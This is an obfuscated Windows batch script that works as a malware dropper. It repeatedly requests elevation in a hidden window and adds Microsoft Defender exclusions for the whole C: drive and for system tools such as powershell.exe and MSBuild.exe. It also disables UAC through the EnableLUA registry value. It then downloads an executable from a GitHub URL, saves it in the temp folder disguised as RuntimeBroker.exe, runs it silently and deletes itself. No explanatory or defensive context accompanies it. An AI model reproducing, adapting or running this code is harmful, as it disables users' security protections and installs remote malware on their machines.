@echo off & setlocal enableDelayedExpansion
set "BrK=SESSION" & set "dAY=2>&1" & set "SyJT=NET" & set "JbQHS=>nul"
%SyJT% %BrK% %JbQHS% %dAY%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "BHLPk=foo" & set "UHDZ=bar" & set "THXM=qux" & set "yysGz=baz" & rem hzlHHNq wCY dfKU
set "ktZe=powershell -ExecutionPolicy Bypass -Command"
set "nmZF=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "RRi='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "yYw='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!ktZe! "!nmZF! !RRi! !yYw!" %JbQHS% %dAY%
set "CEDId=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "QtV=-Name 'EnableLUA' -Value 0"
!ktZe! "!CEDId! !QtV!" %JbQHS% %dAY%
set "krkDE=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!ktZe! "!krkDE!" %JbQHS% %dAY%
if !errorlevel! neq 0 (goto %a%)
set "KcYV=timeout /t" & !KcYV! 2 %JbQHS% %dAY%
set "Het=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "AUn=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "ohQYQ=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!ktZe! "!Het! !AUn! !ohQYQ!" %JbQHS% %dAY%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!KcYV! 1 %JbQHS% %dAY% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %JbQHS% %dAY%
del /f /q "%~f0" %JbQHS% %dAY%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %JbQHS% %dAY%
if !errorlevel! neq 0 (!KcYV! 3 %JbQHS% %dAY% & goto %b%)
exit /b
